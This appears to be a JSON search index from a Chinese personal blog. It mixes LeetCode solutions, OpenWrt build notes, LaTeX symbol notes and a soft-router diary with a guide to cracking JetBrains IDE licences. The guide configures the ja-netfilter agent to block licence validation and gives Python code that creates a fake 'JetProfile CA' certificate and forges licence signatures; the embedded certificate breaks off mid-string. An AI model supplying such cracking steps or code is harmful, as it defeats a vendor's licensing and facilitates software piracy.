[{"categories":["Leetcode"],"content":"\rtext 关键：题目中关键信息 题解：自己或别人的解题思路 特解：这道题使用特殊方法 Get：学到的点\r","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:0:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#"},{"categories":["Leetcode"],"content":"\r2869. 收集元素的最少操作次数题解：从数组末端开始，标记数组，只有小于K的去求余标记，然后求和查一下是不是全1。全1返回结果 python class Solution(object): def minOperations(self, nums, k): \"\"\" :type nums: List[int] :type k: int :rtype: int \"\"\" flag = [0] * k for i in range(len(nums)-1, -1, -1): if nums[i]\u003c=k: flag[nums[i]%k] = 1 if sum(flag) == k: return len(nums)-i\r题解：创建k的集合从集合里删除数字，为空返回。 ","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:1:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#2869-收集元素的最少操作次数httpsleetcodecnproblemsminimum-operations-to-collect-elements"},{"categories":["Leetcode"],"content":"\r2974. 最小数字游戏关键：bob先加入arr，Alice后加。为什么要刻意强调数组是偶数长度？ 特解：排序后两两交换大的在前。 python class Solution(object): def numberGame(self, nums): \"\"\" :type nums: List[int] :rtype: List[int] \"\"\" nums.sort() for i in range(0, len(nums), 2): nums[i], nums[i + 1] = nums[i + 1], nums[i] return nums\rGet：pop时候从后往前删，不然会越界。 ","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:2:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#2974-最小数字游戏httpsleetcodecnproblemsminimum-number-game"},{"categories":["Leetcode"],"content":"\r1103. 分糖果 II题解：等差序列为1求序列和公式，对糖果数量 candies 求解并向下取整，得到的是每次增加一个可以分给几个小朋友 n（有剩余，因为使用的是取整），然后生成一个 1 到 n 的等差序列数组，数组最后加上剩余的糖果。遍历序列下标，下标对 num_people 求余加到最终答案数组里。 python class Solution(object): def distributeCandies(self, candies, num_people): \"\"\" :type candies: int :type num_people: int :rtype: List[int] \"\"\" import math pre_check = math.floor((((-1) + (math.sqrt(1 + 8 * candies))) / 2)) leaf_candy = int(candies - (pre_check * (pre_check + 1) / 2)) series = [i for i in range(1,int(pre_check+1))] series = series + [leaf_candy] if leaf_candy \u003e 0 else series res = [0] * num_people for i in range(0, len(series)): res[i % num_people] = res[i % num_people] + series[i] return res\r","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:3:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#1103-分糖果-iihttpsleetcodecnproblemsdistribute-candies-to-people"},{"categories":["Leetcode"],"content":"\r944. 删列造序题解：获取 strs 长度 l 代表一列的字符串长度，l_str 是有几列。然后相邻两个比较大小（python直接比价ASCII值）如果发生前面比后面大就说明不是严格递增。 python class Solution(object): def minDeletionSize(self, strs): \"\"\" :type strs: List[str] :rtype: int \"\"\" l = len(strs) l_str = len(strs[0]) res = 0 for i in range(l_str): for j in range(l-1): if strs[j][i] \u003e strs[j+1][i]: res += 1 break return res\r","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:4:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#944-删列造序httpsleetcodecnproblemsdelete-columns-to-make-sorted"},{"categories":["Leetcode"],"content":"\r3142. 判断矩阵是否满足条件题解：判断所有竖列相同，任选一行判断横向相邻不相同。 python class Solution(object): def satisfiesConditions(self, grid): \"\"\" :type grid: List[List[int]] :rtype: bool \"\"\" for i in range(len(grid[0])-1): k = grid[0][i] if grid[0][i] == grid[0][i+1]: return False for j in range(len(grid)): if grid[j][i] != k: return False k = grid[0][len(grid[0])-1] for j in range(len(grid)): if grid[j][len(grid[0])-1] != k: return False return True\r","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:5:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#3142-判断矩阵是否满足条件httpsleetcodecnproblemscheck-if-grid-satisfies-conditions"},{"categories":["Leetcode"],"content":"\r1450. 在既定时间做作业的学生人数题解：要求 queryTime 处于 [startTime[i], endTime[i]] 之间。 python class Solution(object): def busyStudent(self, startTime, endTime, queryTime): \"\"\" :type startTime: List[int] :type endTime: List[int] :type queryTime: int :rtype: int \"\"\" res = 0 for i in range(len(startTime)): if endTime[i] \u003c queryTime: continue else: if startTime[i] \u003c= queryTime: res += 1 return res\r其他题解：用flag标记，开始时间值为1，结束时间值为-1，从开头截取数组到queryTime 即 flag[:queryTime + 1]求和就是结果。 Get：有人在评论区问这样枚举 就可以了，其他方案都是来搞笑的，但是对于多次查询的话其他题解的方式就是一劳永逸。 ","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:6:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#1450-在既定时间做作业的学生人数httpsleetcodecnproblemsnumber-of-students-doing-homework-at-a-given-time"},{"categories":["Leetcode"],"content":"\r3153. 所有数对中数位差之和题解：数字长度一样，按照个十百的顺序处理每一位，对最后一位取余使用 flag 统计个数，最后对 flag 数组计算每个元素乘它右边元素值加到 res 上（比如个位4出现两次，5出现三次，那么这5个数不管其他位，个位比较且不同次数至少为2*3=6次，只能乘右边是避免重复） python class Solution(object): def sumDigitDifferences(self, nums): \"\"\" :type nums: List[int] :rtype: int \"\"\" len_num = len(str(nums[0])) res = 0 for i in range(len_num): flag = [0]*10 for j in nums: flag[(j // 10**i) % 10] += 1 # print(flag) for m in range(10): if flag[m] \u003e 0: for n in range(m+1, 10): if flag[n] \u003e 0: res += flag[m]*flag[n] return res\r官方题解差不多，它是都乘结果除以2。 ","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:7:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#3153-所有数对中数位差之和httpsleetcodecnproblemssum-of-digit-differences-of-all-pairs"},{"categories":["Leetcode"],"content":"\r3127. 构造相同颜色的正方形题解：遍历格子的右、右下、下。统计相同颜色超过3个就返回 True。 python for i in range(2): for j in range(2): flag = [] flag.append(grid[i][j]) flag.append(grid[i+1][j]) flag.append(grid[i][j+1]) flag.append(grid[i+1][j+1]) from collections import Counter cnt = Counter(flag) for value in cnt.values(): if value \u003e= 3: return True return False\r","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:8:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#3127-构造相同颜色的正方形httpsleetcodecnproblemsmake-a-square-with-the-same-color"},{"categories":["Leetcode"],"content":"\r2024. 考试的最大困扰度题解：就是判断最大连续的字符数，但是可以修改字符使其更长。使用滑动窗口。以 T 为例，left 和 right 记录最长的区间，sum 记录为 F 的区间长度。right 往右移，遇 T 不增加 F 增加 sum，如果 sum 大于 k，则左区间也往右移清零，ans 记录最大值答案。 python class Solution(object): def maxConsecutiveAnswers(self, answerKey, k): \"\"\" :type answerKey: str :type k: int :rtype: int \"\"\" def maxCont(ch): left,ans,sum=0,0,0 for right in range(len(answerKey)): sum += answerKey[right] != ch while sum \u003e k: sum -= answerKey[left] != ch left += 1 ans = max(ans,right-left+1) return ans return max(maxCont('T'),maxCont('F'))\r同1004. 最大连续1的个数 III ","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:9:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#2024-考试的最大困扰度httpsleetcodecnproblemsmaximize-the-confusion-of-an-exam"},{"categories":["Leetcode"],"content":"\r2708. 一个小组的最大实力值\rpython class Solution(object): def maxStrength(self, nums): \"\"\" :type nums: List[int] :rtype: int \"\"\" nums = sorted(nums) if len(nums) == 1: return nums[0] if len(nums) == 2: ans = nums[0] * nums[1] if ans \u003c= 0: return max(nums) return ans pos_cnt, zero_cnt, neg_cnt = 0, 0, 0 ans = 1 max_nav = -10 for i in range(len(nums)): if nums[i] == 0: zero_cnt += 1 continue if nums[i] \u003e 0: pos_cnt += 1 else: max_nav = max(max_nav, nums[i]) neg_cnt += 1 ans *= nums[i] if pos_cnt == 0: if neg_cnt == 1 or neg_cnt == 0: return 0 if ans \u003c 0: ans = ans // max_nav return ans\r题解：分类讨论，我要气晕了。感觉代码里我考虑情况重复了。 仅有一个数，直接返回。 数组中小于等于1个负数，其他都是0，在 ans // max_nav 时要注意最大值是0。 其他情况，非零数全乘，如果值为正返回，如果值为负，除以最大的非零负数 max_nav就是答案。 ","date":"2024-09-02","objectID":"/posts/leetcode/2024_09_02/:10:0","series":null,"tags":["题解"],"title":"菜鸡解题1","uri":"/posts/leetcode/2024_09_02/#2708-一个小组的最大实力值httpsleetcodecnproblemsmaximum-strength-of-a-group"},{"categories":["瞎折腾"],"content":"主题 text cd package mkdir openwrt-packages cd openwrt-packages git clone https://github.com/jerrykuku/luci-theme-argon.git git clone https://github.com/thinktip/luci-theme-neobird.git git clone https://github.com/rosywrt/luci-theme-rosy.git git clone https://github.com/gngpp/luci-theme-design.git git clone https://github.com/xiaoqingfengATGH/luci-theme-infinityfreedom.git\r软件 text git clone https://github.com/Zxilly/UA2F.git package/UA2F git clone https://github.com/mchome/openwrt-dogcom.git package/dogcom git clone https://github.com/UnblockNeteaseMusic/luci-app-unblockneteasemusic.git package/UnblockNeteaseMusic\r修改源 text sed -i '$a src-git kenzo https://github.com/kenzok8/openwrt-packages' feeds.conf.default sed -i '$a src-git small https://github.com/kenzok8/small' feeds.conf.default git pull ./scripts/feeds update -a ./scripts/feeds install -a make menuconfig\rtheme LuCI –\u003e Themes UnblockNeteaseMusic LuCI –\u003e Applications –\u003e ua2f UA2F Network –\u003e Routing and Redirection –\u003e luci-app-unblockneteasemusic dogcom Network \u003e dogcom 配置编译 iptables 模块（没配也照样用了） Network –\u003e Firewall –\u003e iptables-mod-filter iptables-mod-ipopt iptables-mod-u32 ","date":"2023-09-15","objectID":"/posts/play_time/lede-%E7%BC%96%E8%AF%91/:0:0","series":null,"tags":["软路由"],"title":"lede 编译","uri":"/posts/play_time/lede-%E7%BC%96%E8%AF%91/#"},{"categories":["瞎折腾"],"content":"突然想开发了我的 IDEA 还是 2021 的，IDEA 和 Pycharm 还在机械硬盘，装个最新的到固态里面。教育邮箱懒得申请了，失效了又要麻烦续杯。写出来记录一下以后自己参考。 所提供的内容仅供学习交流使用,严禁用于商业用途,请于下载后24小时内删除。 ","date":"2023-08-30","objectID":"/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/:0:0","series":null,"tags":["破解"],"title":"JetBrains 全家桶破解","uri":"/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/#"},{"categories":["瞎折腾"],"content":"\r准备破解使用的是 ja-netfilter：https://gitee.com/ja-netfilter/ja-netfilter。release 下载以后解压。 config 配置文件默认为空，需要添加一些配置。plugins 是可以加载一些其他联动插件，本文使用的方法不用其他插件。 找到 IDEA 或者 Pycharm 的 Help —\u003e Edit Custom VM Options 添加启动参数，路径是ja-netfilter的 jar 包路径。 text -javaagent:C:\\\\path\\\\to\\\\ja-netfilter.jar\rJetbrain全家桶在2022.2版本以上默认启用Java17，所以用的时候需要在 VM Options 里额外增加下面两行参数。 text --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED\r在这里修改的 VM Options 配置文件路径是 C 盘下的本版本全局配置，也可以修改添加到安装目录下的 bin 目录中的 idea64.exe.vmoptions 配置文件。 ","date":"2023-08-30","objectID":"/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/:1:0","series":null,"tags":["破解"],"title":"JetBrains 全家桶破解","uri":"/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/#准备"},{"categories":["瞎折腾"],"content":"\r修改其他配置修改 config 修改文件夹下的 congig/url.conf text [URL] PREFIX,https://account.jetbrains.com/lservice/rpc/validateKey.action\rcongig/dns.conf text [DNS] EQUAL,jetbrains.com\r","date":"2023-08-30","objectID":"/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/:2:0","series":null,"tags":["破解"],"title":"JetBrains 全家桶破解","uri":"/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/#修改其他配置"},{"categories":["瞎折腾"],"content":"\r激活","date":"2023-08-30","objectID":"/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/:3:0","series":null,"tags":["破解"],"title":"JetBrains 全家桶破解","uri":"/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/#激活"},{"categories":["瞎折腾"],"content":"\r使用 power 插件power 插件被作者成为非对称加密的屠龙刀，这种方式激活可以自定义信息，并且可以设置全家桶激活。 参考大佬博客文章 本地运行两个 python 文件，一个用于生成本地证书签名文件 python import datetime from cryptography import x509 from cryptography.hazmat.backends import default_backend from cryptography.hazmat.primitives import hashes, serialization from cryptography.hazmat.primitives.asymmetric import rsa from cryptography.x509.oid import NameOID one_day = datetime.timedelta(days=1) ten_day = datetime.timedelta(days=3650) today = datetime.datetime.today() yesterday = today - one_day tomorrow = today + ten_day private_key = rsa.generate_private_key( public_exponent=65537, key_size=4096, backend=default_backend() ) public_key = private_key.public_key() builder = x509.CertificateBuilder() builder = builder.subject_name(x509.Name([ x509.NameAttribute(NameOID.COMMON_NAME, 'MoYuno-from-2022-07-25'), ])) builder = builder.issuer_name(x509.Name([ x509.NameAttribute(NameOID.COMMON_NAME, 'JetProfile CA'), ])) builder = builder.not_valid_before(yesterday) builder = builder.not_valid_after(tomorrow) builder = builder.serial_number(x509.random_serial_number()) builder = builder.public_key(public_key) certificate = builder.sign( private_key=private_key, algorithm=hashes.SHA256(), backend=default_backend() ) private_bytes = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption()) public_bytes = certificate.public_bytes( encoding=serialization.Encoding.PEM) with open(\"ca.key\", \"wb\") as fout: fout.write(private_bytes) with open(\"ca.crt\", \"wb\") as fout: fout.write(public_bytes)\r还有一个生成 key 和伪造验签 py import base64 from Crypto.Hash import SHA1, SHA256 from Crypto.PublicKey import RSA from Crypto.Signature import pkcs1_15 from Crypto.Util.asn1 import DerSequence, DerObjectId, DerNull, DerOctetString from Crypto.Util.number import ceil_div from cryptography import x509 from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.asymmetric import padding # noinspection PyTypeChecker def pkcs15_encode(msg_hash, emLen, with_hash_parameters=True): \"\"\" Implement the ``EMSA-PKCS1-V1_5-ENCODE`` function, as defined :param msg_hash: hash object :param emLen: int :param with_hash_parameters: bool :return: An ``emLen`` byte long string that encodes the hash. \"\"\" digestAlgo = DerSequence([DerObjectId(msg_hash.oid).encode()]) if with_hash_parameters: digestAlgo.append(DerNull().encode()) digest = DerOctetString(msg_hash.digest()) digestInfo = DerSequence([ digestAlgo.encode(), digest.encode() ]).encode() # We need at least 11 bytes for the remaining data: 3 fixed bytes and # at least 8 bytes of padding). if emLen \u003c len(digestInfo) + 11: raise TypeError(\"Selected hash algorithm has a too long digest (%d bytes).\" % len(digest)) PS = b'\\xFF' * (emLen - len(digestInfo) - 3) return b'\\x00\\x01' + PS + b'\\x00' + digestInfo certBase64 = \"MIIFTDCCAzSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIyMDcyNTIzMTcwOVoXDTMyMDcyMzIzMTcwOVowHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDDx3gz77KvezmZJhwkF/10Q3vESk96tK6wJ00CSKkLybRDeQVOlHX3QAnPL7BjwCTzHqErsuyPuiZ6YTAVE/n7hLhIbh3lC+EBbxpa2hpIdIvUimr70iSrH9ZBWmnn5Fxy4r/r0tbxr34zpQzu4uWLiEqmOiDfRN+Zzj9FBaJ/gKsuhF7zNAbFHsClYntim5furDRITBra28nu0hfQIEBSHGPS2EKWTbKk2ifBLzMEDp99zIGEe/hrLpgBhdwGVD7VJsoeTXnvcgpt+91kiM918GWThO1L3eKU6W2mGZQv1bRyps7Fo61NElNWtJqqZ3KKyxJGyR1QpdOHd9flAesvYwb/lvc4uqYiKqwvvn+4iHPQlLtZDbzj0ICbKtVKSWgSprh0T5ZQGGNWXN4OMHtg9EuXvbagLshTEDkLKLzEBqSNpNmMmyzwyNO9/voQmHLjiWLdjVIYndjl15G+A9Dw5mVYqzKPMLEpHzg6ldkKJkGAxNBhCMUsmbEypT6r7wsdTvgEwFnP8ToOsAb12lSLxoR2bOT3xJ3WIfbyjvlBnauXfdu6SFF/82QFrLtQyddPvCHEiJTI0NmSYhjQObFohXMVVoXjGbXvuqgJNbc5UK06pCGQ2jKw4j6k1kw2g4fEYBd1fvEzb1/t+izpP8dEI0365xh0C1dpQjUj3uyRywIDAQABo4GZMIGWMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwCQYDVR0TBAIwADATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwHQYDVR0OBBYEFCTaESKW9YVB","date":"2023-08-30","objectID":"/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/:3:1","series":null,"tags":["破解"],"title":"JetBrains 全家桶破解","uri":"/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/#使用-power-插件"},{"categories":["学习笔记"],"content":"https://blog.csdn.net/m0_55746113/article/details/122728673 ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:0:0","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#"},{"categories":["学习笔记"],"content":"\r标注符号","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:1:0","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#标注符号"},{"categories":["学习笔记"],"content":"\r上下标上标符号为“^”、下标符号为“_” ，多于一个字符用{}包含，例如2^r、a_5 $2^r,a_5,A_{n+1}$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:1:1","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#上下标"},{"categories":["学习笔记"],"content":"\r平均值、箭头、向量等加^号：\\hat{x} 加横线：\\overline{x} 加^：\\widehat{x} 加波浪线：\\widetilde{x} 加一个点：\\dot{x} 加两个点：\\ddot{x} $\\hat x,\\overline x,\\widehat x,\\widetilde x,\\dot x,\\ddot x$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:1:2","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#平均值箭头向量等"},{"categories":["学习笔记"],"content":"\r加粗矩阵字母一般会用加粗的罗马体来表示。\\bf ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:1:3","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#加粗"},{"categories":["学习笔记"],"content":"\r根号\\sqrt{} ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:2:0","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#根号"},{"categories":["学习笔记"],"content":"\r希腊字母表 ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:3:0","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#希腊字母表"},{"categories":["学习笔记"],"content":"\r运算符号","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:4:0","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#运算符号"},{"categories":["学习笔记"],"content":"\r加减乘除+ 和 -。\\times 和 \\div。点乘用 \\cdot $ +,-,\\times,\\div,\\cdot$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:4:1","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#加减乘除"},{"categories":["学习笔记"],"content":"\r大于、小于、约等于大于小于直接 \u003e 、 \u003c 大于等于 \\ge，小于等于 \\le 远大于 \\gg，远小于 \\ll 不等于 \\ne 约等于 \\approx $\u003e,\u003c,\\ge,\\le,\\gg,\\ll,\\ne,\\approx$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:4:2","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#大于小于约等于"},{"categories":["学习笔记"],"content":"\r分式和根式\\frac{分子}{分母}或\\frac 分子 分母。如 $ \\frac{1}{2}$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:4:3","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#分式和根式"},{"categories":["学习笔记"],"content":"\r交集并集交集用 \\cap 并集用 \\cup $\\cap,\\cup$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:4:4","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#交集并集"},{"categories":["学习笔记"],"content":"\r属于不属于属于用 \\in 不属于用 \\notin $\\in,\\notin$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:4:5","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#属于不属于"},{"categories":["学习笔记"],"content":"\r省略号横向省略号 \\cdots 垂直省略号 \\vdots 斜向省略号 \\ddots $\\cdots, \\vdots , \\ddots $ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:4:6","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#省略号"},{"categories":["学习笔记"],"content":"\r求和与求积求和用 \\sum 求积（product）用 \\prod 可以用\\limits来强制显示在下方。 $\\sum,\\prod,\\sum_i,\\sum \\limits_{i=1}^N,\\prod_{i=1}^N x_i$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:4:7","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#求和与求积"},{"categories":["学习笔记"],"content":"\r标注符号","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:5:0","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#标注符号-1"},{"categories":["学习笔记"],"content":"\r括号小括号直接 ()，中括号直接 []，大括号 \\{\\}。 左向上取整 \\lceil，右向上取整 \\rceil $\\lceil ,\\rceil $ 左向下取整 \\lfloor，右向下取整 \\rfloor $\\lfloor ,\\rfloor $ 绝对值用|| 下方加符号在任意符号下面加符号 \\underset{}{}。例如 \\underset{B}{A}。在下方换行使用 \\substack{}。 $\\underset{B}{A}，\\underset{\\substack{B\u003e0 \\ C\u003c0}}{A}$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:5:1","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#括号"},{"categories":["学习笔记"],"content":"\r括号小括号直接 ()，中括号直接 []，大括号 \\{\\}。 左向上取整 \\lceil，右向上取整 \\rceil $\\lceil ,\\rceil $ 左向下取整 \\lfloor，右向下取整 \\rfloor $\\lfloor ,\\rfloor $ 绝对值用|| 下方加符号在任意符号下面加符号 \\underset{}{}。例如 \\underset{B}{A}。在下方换行使用 \\substack{}。 $\\underset{B}{A}，\\underset{\\substack{B\u003e0 \\ C\u003c0}}{A}$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:5:1","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#下方加符号"},{"categories":["学习笔记"],"content":"\r花体符号傅里叶变换中的f用 \\mathcal $\\mathcal f,\\mathcal L,\\mathcal G$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:5:2","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#花体符号"},{"categories":["学习笔记"],"content":"\r多行公式使用 \\\\ 来换行，使用 \\begin{align}、\\end{align} 环绕表示多行环境。多行环境\\\\默认右对齐，如果想要使某个符号对齐，需要在符号前加 \u0026，例如=号前面 $ \\begin{align} a\u0026=b+c+d \\ \u0026=e+f \\end{align}$ $$ \\begin{align} a\u0026=b+c+d \\ \u0026=e+f \\end{align} $$ ","date":"2023-05-21","objectID":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/:6:0","series":null,"tags":["LaTex"],"title":"LaTex数学公式","uri":"/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/#多行公式"},{"categories":["瞎折腾"],"content":"\r前言在学校疫情期间买了一个 j4125 的软路由，一直等到回家过了很久才到手，因为买的是裸机，还有些配件是在别的店买的，回家以后发现地址只能在区以内修改，只能取消订单重新下了单。 最后的配件列表如下： DDR4 8G * 2 128G msata * 1 金士顿 480G sata * 1 （送的有sata的电源线和数据线，要注意下电源线用那种带拐角的，不然不好插上去） DV 12V5A 电源 5.5mm 原来咸鱼上买了假三星内存条回来插上发现不能用，所以把笔记本上的两根 8G 换下来了，然后又觉得电脑单根有点卡，所以又下了一单，哈哈哈现在电脑上是假三星 32G。电源是发货最慢的，我把家里路由器机顶盒的电源找了个遍，发现都插不上去，重要的是同样是圆口的插孔，还分好多不一样的尺寸，这个是最大的 5.5mm 的，最后出去找了一家买监控的店，在压箱货里面找到了一个非常非常塑料感的电源，卖了我 30 块，我现在还记得我进去的时候老板正在玩魔兽骑着坐骑跑路。 再安利两个视频，我前期了解主要通过这两个 up 的视频学习的。 保姆级J4125英特尔2.5G安装PVE+Ikuai+Openwrt 用U盘直接给J4125软路由安装OpenWrt固件，超简单小白也看得懂 ","date":"2023-02-03","objectID":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/:1:0","series":null,"tags":["软路由"],"title":"软路由日记(一)","uri":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/#前言"},{"categories":["瞎折腾"],"content":"\r准备材料需要准备： U盘一个。制作引导盘，安装完成以后可以恢复 键盘。安装向导需要一些配置 网线。安装完成以后可以访问 web页面配置 软件安装包： Restful。官网：http://rufus.ie/zh/ pve镜像。官网：https://www.proxmox.com/en/downloads。要下载名称有 ISO Installer 才是系统镜像文件 ","date":"2023-02-03","objectID":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/:2:0","series":null,"tags":["软路由"],"title":"软路由日记(一)","uri":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/#准备材料"},{"categories":["瞎折腾"],"content":"\rRestful 制作安装插上U盘，打开 Restful 写入镜像文件，设备选择U盘盘符，引导类型选择镜像文件，然后右边选择下载好的 PVE 镜像文件，其他的配置默认即可。 确认以后会有一个弹窗选择 DD 镜像模式写入。用个网上找的图片 